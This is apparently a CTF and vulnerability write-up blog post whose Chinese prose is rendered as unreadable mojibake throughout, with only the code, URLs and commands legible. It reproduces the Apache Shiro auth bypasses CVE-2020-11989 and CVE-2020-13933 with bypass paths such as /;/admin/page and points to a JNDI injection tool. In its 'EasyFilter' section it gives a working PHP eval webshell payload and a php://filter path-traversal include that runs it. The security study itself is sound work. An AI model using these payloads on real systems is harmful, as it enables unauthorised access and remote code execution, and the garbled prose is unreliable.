&lt;p>è®¿é—®/jsonï¼ŒåŽé¢ä¼šå¸¦ä¸€å †getè¯·æ±‚çš„å‚æ•°ï¼Œç”¨/;/jsonç»•è¿‡ï¼ˆcve-2020-11989ï¼‰&lt;/p>
&lt;p>ä¸Šå·¥å…·&lt;a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0">JNDI-Injection-Exploit&lt;/a>ä¸€æŠŠæ¢­ï¼ˆé—®é¢˜å‡ºåœ¨æˆ‘vpsä¸Šæ²¡æœ‰javaçŽ¯å¢ƒ ç«¯å£è½¬å‘åˆå¤„äº†äº¿ç‚¹ç‚¹é—®é¢˜â€¦â€¦ æ‰€ä»¥æ²¡æœ‰å¸¦å‡ºæ¥flagï¼‰ï¼Œæ˜¯cve-2020-36188&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024041750586.png" alt="image-20211024041750586">&lt;/p>
&lt;p>å“­å“­&lt;/p>
&lt;p>è¿˜æœ‰ä¸ªå·¥å…·æ˜¯ &lt;a href="https://github.com/Firebasky/LdapBypassJndi">LdapBypassJndi&lt;/a>ï¼Œå·®ä¸å¤šçš„ï¼›ä¸‹é¢æ˜¯è·Ÿä¸€è·Ÿæ¶‰åŠåˆ°çš„å‡ ä¸ªé“¾å­&lt;/p>
&lt;h3 id="cve-2020-11989">CVE-2020-11989&lt;/h3>
&lt;p>å‚è€ƒï¼š&lt;a href="https://mp.weixin.qq.com/s/yb6Tb7zSTKKmBlcNVz0MBA">Apache Shiroæƒé™ç»•è¿‡æ¼æ´žåˆ†æž(CVE-2020-11989)&lt;/a> | &lt;a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/">Apache Shiro èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´ž (CVE-2020-11989)&lt;/a>&lt;/p>
&lt;p>Apache Shiroæ˜¯ä¸€ä¸ªå¸¸ç”¨çš„javaå®‰å…¨æ¡†æž¶ï¼Œåœ¨1.5.3ä¹‹å‰ç‰ˆæœ¬ä¸­å½“Shiroä¸ŽSpringåŠ¨æ€æŽ§åˆ¶å™¨ä¸€èµ·ä½¿ç”¨æ—¶ï¼ˆSpringæ¡†æž¶ä¸­åªç”¨Shiroé‰´æƒï¼‰ï¼Œå¦‚æžœç›´æŽ¥è®¿é—®/shiro/admin/pageä¼š302è·³è½¬è¦æ±‚ç™»å½•ï¼Œè€Œè®¿é—®/;shiro/admin/pageå³å¯ç»•è¿‡æƒé™éªŒè¯ï¼Œè®¿é—®/adminçš„ä¿¡æ¯&lt;/p>
&lt;h4 id="æœ¬åœ°çŽ¯å¢ƒæ­å»ºå¤çŽ°">æœ¬åœ°çŽ¯å¢ƒæ­å»º&amp;amp;å¤çŽ°&lt;/h4>
&lt;p>æœ‰å¸¦ä½¬ç›´æŽ¥å†™å¥½çš„dockerå¯ä»¥ç›´æŽ¥pullæ‹¿æ¥ç”¨&lt;/p>
&lt;pre tabindex="0">&lt;code>docker pull jackey0/cve-2020-11989
docker run -p 8426:8080 &amp;lt;image&amp;gt; /bin/sh -c 'java -jar /springboot-shiro-0.0.1-SNAPSHOT.jar'
docker pull jackey0/cve-2020-13933
// docker start &amp;lt;container-id&amp;gt;
&lt;/code>&lt;/pre>&lt;p>æˆ–è€…ä¸‹è½½&lt;a href="https://github.com/l3yx/springboot-shiro">l3yx/springboot-shiro&lt;/a>é¡¹ç›®åˆ°æœ¬åœ°ç¼–è¯‘ä¸ºwaråŒ…ï¼ˆæˆ–è€…ä¹Ÿæœ‰ç¼–è¯‘å¥½çš„&lt;a href="https://github.com/backlion/demo/blob/master/shiro.war">shiro.war&lt;/a>ï¼‰ä¹‹åŽæ‰‹åŠ¨æ”¾å…¥tomcatä¸‹çš„webappsç›®å½•ä¸‹è¿è¡Œã€‚æ˜¾ç„¶dockerå¤ªé¦™äº†ï¼ï¼ï¼ï¼ï¼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025224051899.png" alt="image-20211025224051899">&lt;/p>
&lt;p>è®¿é—®æ˜ å°„åˆ°å¤–éƒ¨çš„8426ç«¯å£ï¼ŒçŽ¯å¢ƒæ­å»ºå®Œæ¯•&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025224115269.png" alt="image-20211025224115269">&lt;/p>
&lt;p>postæ–¹å¼è¯·æ±‚/doLoginé¡µé¢ï¼Œçœ‹åˆ°cookieä¸­å«rememberMe=deleteMeï¼Œç¡®å®šä¸ºshiro&lt;/p>
&lt;p>è®¿é—®/admin/pageé¡µé¢ï¼Œ302é‡å®šå‘è‡³/loginé¡µé¢è¦æ±‚ç™»å½•&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025232735464.png" alt="image-20211025232735464">&lt;/p>
&lt;p>è®¿é—®/;/admin/pageé¡µé¢ï¼Œç»•è¿‡é‰´æƒï¼Œå›žæ˜¾admin page&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025232717422.png" alt="image-20211025232717422">&lt;/p>
&lt;h4 id="æºç åˆ†æžåŠ¨è°ƒ">æºç åˆ†æž&amp;amp;åŠ¨è°ƒ&lt;/h4>
&lt;p>å…ˆæŠŠjaråŒ…ä¸‹è½½åˆ°åœ¨æœ¬åœ°ï¼Œå¯¼å…¥idea&lt;/p>
&lt;pre tabindex="0">&lt;code>docker cp &amp;lt;container-id&amp;gt;:/springboot-shiro-0.0.1-SNAPSHOT.jar /home/name/t3mp/
&lt;/code>&lt;/pre>&lt;p>ä½¿ç”¨ideaè¿œç¨‹å¯¹dockerä¸­éƒ¨ç½²çš„springbooté¡¹ç›®è¿›è¡Œdebug&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026033544920.png" alt="image-20211026033544920">&lt;/p>
&lt;pre tabindex="0">&lt;code>docker run -p 8426:8080 -p 8001:1456 3eefd8918689 /bin/sh -c 'java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1456 /springboot-shiro-0.0.1-SNAPSHOT.jar'
&lt;/code>&lt;/pre>&lt;p>Shiroçš„æƒé™æ ¡éªŒæ˜¯é€šè¿‡åˆ¤æ–­urlçš„åŒ¹é…æ¥è¿›è¡Œçš„ï¼Œå¦‚æžœShiroèŽ·å–çš„urlå’Œwebæ¡†æž¶å¤„ç†çš„urlç»“æžœä¸ä¸€è‡´æ—¶å°±é€ æˆäº†æƒé™ç»•è¿‡ï¼›Shiroå¯¹äºŽurlçš„èŽ·å–å’ŒåŒ¹é…åœ¨&lt;code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain&lt;/code>ä¸­è¿›è¡Œã€‚&lt;/p>
&lt;p>ä»¥è®¿é—®/;/admin/pageä¸ºä¾‹ï¼Œé€šè¿‡å®ƒçš„&lt;code>getPathWithinApplication()&lt;/code>å¾—åˆ°çš„requestURI=&amp;quot;/&amp;quot;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026105323534.png" alt="image-20211026105323534">&lt;/p>
&lt;p>è·Ÿå…¥æ­¤å‡½æ•°çš„å¤„ç†é€»è¾‘&lt;code>org.apache.shiro.web.util.WebUtils#getPathWithinApplication&lt;/code>ï¼Œè¿›å…¥&lt;code>getRequestUri()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026113806371.png" alt="image-20211026113806371">&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨ä¸­é—´è¿‡ç¨‹ä¸­uri=&amp;quot;/;/admin/page&amp;quot;ï¼Œä½†æ˜¯ä»Žä¸Šé¢æˆ‘ä»¬å¯ä»¥çŸ¥é“ç»è¿‡&lt;code>normalize(decodeCleanUriString())&lt;/code>å¤„ç†è¿‡åŽè¿”å›žçš„requestRUI=&amp;quot;/&amp;quot;ï¼Œè·Ÿå…¥è¿™ä¸ªå‡½æ•°ï¼Œå®ƒå…ˆæ˜¯è°ƒç”¨&lt;code>decodeRequestSrting()&lt;/code>ï¼Œæ²¡æœ‰å¯¹ç»“æžœäº§ç”Ÿä»€ä¹ˆå½±å“ï¼Œ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026114857281.png" alt="image-20211026114857281">&lt;/p>
&lt;p>è€Œè¿”å›žæ—¶çš„&lt;code>normalize()&lt;/code>ä¼šæ ¹æ®&amp;quot;;&amp;ldquo;è¿›è¡Œurlçš„æˆªæ–­å¤„ç†ï¼Œæœ€ç»ˆè¿”å›ž&amp;rdquo;/&amp;quot;&lt;/p>
&lt;p>å›žåˆ°å¼€å¤´çš„/;/admin/pageè¯·æ±‚ï¼Œspringä¸­å¤„ç†urlçš„å‡½æ•°åœ¨&lt;code>org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026115653673.png" alt="image-20211026115653673">&lt;/p>
&lt;p>å®ƒè°ƒç”¨çš„æ˜¯springframeworkä¸­è‡ªå·±&lt;code>getPathWithinApplication()&lt;/code>ï¼Œç»è¿‡ä¸€ç•ªéªšæ“ä½œè¿”å›žçš„æ˜¯/admin/page&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026115916664.png" alt="image-20211026115916664">&lt;/p>
&lt;p>è·Ÿå…¥&lt;code>getPathWitinApplication()&lt;/code>ï¼Œå…ˆæ˜¯è°ƒç”¨&lt;code>getContextPath()&lt;/code>ï¼Œè¿”å›ž&amp;quot;/&amp;quot;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026120922475.png" alt="image-20211026120922475">&lt;/p>
&lt;p>ç„¶åŽæ˜¯&lt;code>getRequestUri()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026121402778.png" alt="image-20211026121402778">&lt;/p>
&lt;p>åŒæ ·ï¼Œåœ¨æœ€ç»ˆreturnä¹‹å‰çš„uri=&amp;quot;/;/admin/page&amp;quot;ï¼Œç»è¿‡äº†ä¸€ä¸ª&lt;code>decodeAndCleanUriString()&lt;/code>ï¼Œæ ¹æ®ch=59ä¹Ÿå°±æ˜¯&amp;quot;;&amp;ldquo;ç¬¦è¿›è¡Œä¸€ä¸ªåˆ†å‰²ï¼Œä½¿ç”¨&lt;code>removeSemicolonContentInternal()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026121749767.png" alt="image-20211026121749767">&lt;/p>
&lt;p>äºŽæ˜¯&amp;rdquo;;&amp;ldquo;å°±ä¸è§äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122016422.png" alt="image-20211026122016422">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122121074.png" alt="image-20211026122121074">&lt;/p>
&lt;p>ç„¶åŽè¿”å›ž&amp;rdquo;/admin/page&amp;quot;ç»™&lt;code>getPathWithinApplication()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122204403.png" alt="image-20211026122204403">&lt;/p>
&lt;p>å†ä¼ é€’ç»™&lt;code>getPathWithinServletMapping()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122355835.png" alt="image-20211026122355835">&lt;/p>
&lt;p>æœ€ç»ˆæˆ‘ä»¬è®¿é—®åˆ°çš„é¡µé¢å°±æ˜¯&amp;quot;/admin/page&amp;quot;äº†&lt;/p>
&lt;p>â€”â€”â€”â€”æ€»ç»“ä¸€ä¸‹å°±æ˜¯å½“urlåœ¨shiroå’Œspringä¸­çš„å¤„ç†ä¸ä¸€è‡´ï¼Œå½“è¿›å…¥åº”ç”¨æ—¶è¢«è®¤ä½œæ˜¯è®¿é—®&amp;quot;/;/admin/page&amp;quot;ï¼Œä¸å±žäºŽæˆ‘ä»¬æœ€åˆé…ç½®çš„&amp;quot;/admin/*&amp;ldquo;æƒé™è·¯ç”±ï¼Œè€Œè¿›å…¥shiroåŽå´è¢«æˆªæ–­å¤„ç†ï¼Œè®¤ä½œæ˜¯&amp;rdquo;/admin/page&amp;quot;ï¼Œå±žäºŽæƒé™è·¯ç”±ä¸­ï¼Œæœ€ç»ˆåšåˆ°æƒé™ç»•è¿‡&lt;/p>
&lt;h3 id="cve-2020-13933">CVE-2020-13933&lt;/h3>
&lt;p>ç”±äºŽ11989çš„ä¿®è¡¥å¹¶ä¸å®Œå…¨ï¼Œå¯¼è‡´åˆåˆåˆè¢«ç»•è¿‡äº§ç”Ÿäº†13933â€¦â€¦&lt;/p>
&lt;h4 id="æœ¬åœ°çŽ¯å¢ƒæ­å»ºå¤çŽ°-1">æœ¬åœ°çŽ¯å¢ƒæ­å»º&amp;amp;å¤çŽ°&lt;/h4>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.anquanke.com/post/id/214964#h2-3">shiro &amp;lt; 1.6.0çš„è®¤è¯ç»•è¿‡æ¼æ´žåˆ†æž(CVE-2020-13933)&lt;/a>&lt;/p>
&lt;p>è¿˜æ˜¯é‡‡ç”¨dockerå½¢å¼å¤çŽ°ï¼ˆæˆ‘çˆ±dockerï¼‰è¿™é‡Œç›´æŽ¥å°±æ˜¯è¿œç¨‹è°ƒè¯•çš„å¯åŠ¨å‘½ä»¤å•¦ï¼Œè·Ÿä¸Šé¢çš„ä¸€æ ·é…ç½®å°±å¥½äº†ï¼ˆ&lt;/p>
&lt;pre tabindex="0">&lt;code>docker pull jackey0/cve-2020-13933
docker run -p 8426:8080 -p 8001:1456 3eefd8918689 /bin/sh -c 'java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1456 /springboot-shiro-0.0.1-SNAPSHOT.jar'
&lt;/code>&lt;/pre>&lt;p>è®¿é—®/adminï¼ŒæŠ¥é”™é¡µé¢ä¸”æ— 302è·³è½¬ï¼›è®¿é—®/loginè·³è½¬åˆ°èº«ä»½éªŒè¯é¡µé¢ï¼›è®¿é—®/admin/%3bpageï¼Œæ— èº«ä»½éªŒè¯ä¸”è¿”å›žadmin page&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026171901636.png" alt="image-20211026171901636">&lt;/p>
&lt;h4 id="åŽŸç†åˆ†æžåŠ¨è°ƒ">åŽŸç†åˆ†æž&amp;amp;åŠ¨è°ƒ&lt;/h4>
&lt;p>è¿˜æ˜¯å¯¼å…¥jaråŒ…è‡³ideaï¼Œè¿œç¨‹debug&lt;/p>
&lt;p>ç›´æŽ¥çœ‹çœ‹shiro1.6.0çš„è¡¥ä¸è¡¥åˆ°äº†ä»€ä¹ˆåœ°æ–¹ï¼Œåœ¨githubä¸ŠæŸ¥çœ‹&lt;a href="https://github.com/apache/shiro/compare/shiro-root-1.5.3...shiro-root-1.6.0">diff&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026175139677.png" alt="image-20211026175139677">&lt;/p>
&lt;p>å¢žåŠ äº†&lt;code>InvalidRequestFilter&lt;/code>ç±»ï¼Œæœ‰ä¸ª&lt;code>isAccessAllowed()&lt;/code>å‡½æ•°ï¼Œåœ¨å…¨å±€ä¸Šå¯¹åˆ†å·ã€åæ–œæ ã€éžASCIIç å­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤&lt;/p>
&lt;p>ä»¥è®¿é—®/admin/%3bpageä¸ºä¾‹ï¼Œurlå…ˆç”±shiroè§£æžï¼Œè¿˜æ˜¯&lt;code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain&lt;/code>ï¼Œä¾æ—§æ˜¯è°ƒç”¨&lt;code>getPathWithinApplication()&lt;/code>ï¼Œæ‰§è¡ŒåŽrequestURI=&amp;quot;/admin/&amp;quot;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026181015088.png" alt="image-20211026181015088">&lt;/p>
&lt;p>è€Œä¹‹åŽè¿›å…¥springbootå¤„ç†æ—¶ï¼Œå´å˜æˆäº†&amp;quot;/admin/;page&amp;quot;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026181252374.png" alt="image-20211026181252374">&lt;/p>
&lt;p>å†å›žåˆ°æœ€åˆè·Ÿä¸€ä¸‹å…·ä½“çš„è°ƒç”¨é“¾&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026182540363.png" alt="image-20211026182540363">&lt;/p>
&lt;p>åœ¨&lt;code>removeSemicolon()&lt;/code>å¤„ç†å‰ï¼Œuri=&amp;quot;/admin/;page&amp;quot;ï¼ˆç»&lt;code>decodeAndUriString()&lt;/code>è§£ç äº†ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026182711164.png" alt="image-20211026182711164">&lt;/p>
&lt;p>å¤„ç†åŽpath=&amp;quot;/admin&amp;quot;ï¼ŒæŽ¥ç€è°ƒç”¨&lt;code>normalize()&lt;/code>å‡½æ•°å˜æˆ&amp;quot;/admin&amp;quot;ï¼Œä¼ é€’ç»™æœ€åˆçš„&lt;code>getChain()&lt;/code>ä¸­çš„requestURIå‚æ•°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026183041350.png" alt="image-20211026183041350">&lt;/p>
&lt;p>ä¹‹åŽè¢«springå¤„ç†&lt;code>org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping&lt;/code>ï¼Œå…¶ä¸­ä¼šè°ƒç”¨&lt;code>getRequestUri()&lt;/code>ï¼Œå®ƒä¼šå†æ¬¡è°ƒç”¨&lt;code>decodeAndCleanUriString()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026183542060.png" alt="image-20211026183542060">&lt;/p>
&lt;p>å…ˆ&lt;code>removeSemicolonContent()&lt;/code>å†&lt;code>decodeRequestString()&lt;/code>ï¼Œé‚£æ˜¾ç„¶æ˜¯æ€Žä¹ˆéƒ½åŽ»ä¸æŽ‰&amp;quot;;&amp;ldquo;äº†ï¼Œå°†&amp;rdquo;;page&amp;quot;çœ‹ä½œä¸€ä¸ªæ•´ä½“&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026184529505.png" alt="image-20211026184529505">&lt;/p>
&lt;p>æˆ‘ä»¬å›žè¿‡å¤´åŽ»çœ‹è¿™æ¬¡çš„æƒé™è®¾ç½®æ˜¯æ€Žä¹ˆåŒ¹é…urlçš„ï¼Œå®šä½åˆ°&lt;code>org.syclover.srpingbootshiro.LoginController&lt;/code>å’Œ&lt;code>org.syclover.srpingbootshiro.ShiroConfig#shiroFilterFactoryBean&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026190414964.png" alt="image-20211026190414964">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026190401468.png" alt="image-20211026190401468">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°ï¼Œå¯¹äºŽ&amp;quot;/admin/*&amp;ldquo;éœ€è¦é‰´æƒï¼Œ&amp;quot;/admin/{name}&amp;ldquo;è¿”å›žadmin pageï¼Œè€Œå¯¹äºŽ&amp;rdquo;/admin/&amp;ldquo;å´æ²¡æœ‰è®¾ç½®æƒé™&lt;/p>
&lt;p>ä»Žä¸Šé¢çš„è°ƒè¯•ä¸­æˆ‘ä»¬çŸ¥é“shiroå¾—åˆ°çš„æ˜¯&amp;rdquo;/admin/&amp;quot;ï¼ˆå…ˆdecodeå†åŽ»é™¤&amp;rdquo;;&amp;quot;ï¼‰ï¼Œè¢«è®¤ä½œå¯ä»¥è®¿é—®ï¼›è€Œspringå¾—åˆ°çš„æ˜¯&amp;quot;/admin/;page&amp;quot;ï¼‰å…ˆåŽ»é™¤&amp;quot;;&amp;ldquo;å†decodeï¼‰ï¼Œä¸Ž&amp;rdquo;/admin/{name}&amp;ldquo;çš„æ ·å¼åŒ¹é…ï¼Œæœ€åŽè¿”å›žadmin page &lt;del>ï¼ˆç®€ç›´å¤ªå®Œç¾Žäº†ä¹Ÿ&lt;/del>&lt;/p>
&lt;h4 id="ä¸´æ—¶ä¿®å¤">*ä¸´æ—¶ä¿®å¤&lt;/h4>
&lt;p>ï¼ˆæœ¬åœ°æš‚æ—¶è¿˜æœªå¤çŽ°&lt;/p>
&lt;pre tabindex="0">&lt;code>map.put(&amp;quot;/admin/**&amp;quot;, &amp;quot;authc&amp;quot;);
@GetMapping({&amp;quot;/admin/page&amp;quot;})
public String admin() {
return &amp;quot;admin page&amp;quot;;
}
&lt;/code>&lt;/pre>&lt;h3 id="cve-2020-36188">***CVE-2020-36188&lt;/h3>
&lt;p>&lt;code>ch.qos.logback.core.db.JNDIConnectionSource&lt;/code>&lt;/p>
&lt;p>å¯ä»¥å‚è€ƒ &lt;a href="https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Java%E7%AF%87/#NPUCTF2020-EzShiro">https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Java%E7%AF%87/#NPUCTF2020-EzShiro&lt;/a>ï¼Œå·¥å…· &lt;a href="https://github.com/Firebasky/LdapBypassJndi">LdapBypassJndi&lt;/a> | &lt;a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit&lt;/a>&lt;/p>
&lt;p>â€”â€”â€”â€”ç”±äºŽæˆ‘çš„javaæ°´å¹³å®žåœ¨å¤Ÿå‘›ï¼Œè¿™é‡Œæš‚æ—¶å…ˆç©ºç€ï¼Œç­‰æˆ‘å­¦ä¸€å­¦java ä¹‹åŽå¿…å®šå›žæ¥éž­å°¸&lt;/p>
&lt;h2 id="easyfilter">EasyFilter&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;open_basedir&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;./&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;action&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;action&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;w&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">mkdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;c&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">bin2hex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">random_bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">elseif&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;action&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$r&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;php://filter/resource=&lt;/span>&lt;span style="color:#d88200">$file&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?action=w&amp;amp;c=&amp;lt;?php @eval($_POST['wuhu']);?&amp;gt;
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>/?action=r&amp;amp;r=php://filter/read=convert.base64-decode/resource=/../../../../../files/f8b3731ac9
POST: wuhu=phpinfo();
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023214748589.png" alt="image-20211023214748589">&lt;/p>
&lt;h3 id="å¯¹äºŽpayloadçš„åº•å±‚ä»£ç åˆ†æž">å¯¹äºŽpayloadçš„åº•å±‚ä»£ç åˆ†æž&lt;/h3>
&lt;p>åŽŸç†åˆ†æžæ¥è‡ªGuokeä½¬ æˆ‘åªæ˜¯ä¸ªä¼šå¤çŽ°çš„é“æ²¸ç‰©â€¦â€¦&lt;/p>
&lt;p>é¦–å…ˆä¸‹ä¸€ä»½7.2.34çš„æºç &lt;/p>
&lt;p>å®šä½åˆ°åŒ…è£…å™¨æ‰€åœ¨çš„æ–‡ä»¶ä½ç½®/ext/standard/php_fopen_wrapper.cï¼Œ178è¡Œèµ·æ˜¯php_stream_url_wrap_php()çš„ä»£ç &lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024210116402.png" alt="image-20211024210116402">&lt;/p>
&lt;p>191è¡Œï¼Œå…ˆç¢°åˆ°&lt;code>php://&lt;/code>ä¼šæ‰§è¡Œ&lt;code>path += 6&lt;/code>ï¼›ä¹‹åŽæŽ¥ç€349è¡Œä¼šç¢°åˆ°&lt;code>filter/&lt;/code>&lt;/p>
